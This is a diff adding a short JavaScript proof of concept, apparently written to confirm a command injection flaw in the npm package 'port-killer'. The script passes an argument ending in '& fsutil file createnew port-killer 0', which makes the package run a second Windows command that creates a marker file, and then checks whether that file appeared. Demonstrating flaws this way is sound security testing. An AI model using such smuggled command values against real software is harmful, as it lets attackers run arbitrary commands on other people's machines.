@@ -1,0 +1,20 @@
+// test("Command Injection in port-killer", () => {
+//   expect.assertions(2);
+  const port_killer = require("port-killer");
+  const fs = require("fs");
+  const path = "./port-killer";
+  try {
+    if (fs.existsSync(path)) {
+      fs.unlinkSync(path);
+//       console.log("File removed:", path);
+    }
+  } catch (err) {
+    console.error(err);
+  }
+  file_exist = fs.existsSync(path);
+console.log("{ " + file_exist + ", " + false + " }");
+  port_killer("& fsutil file createnew port-killer 0");
+  file_exist = fs.existsSync(path);
+console.log("{ " + file_exist + ", " + true + " }");
+  fs.unlink(path, function (err) {});
+// });
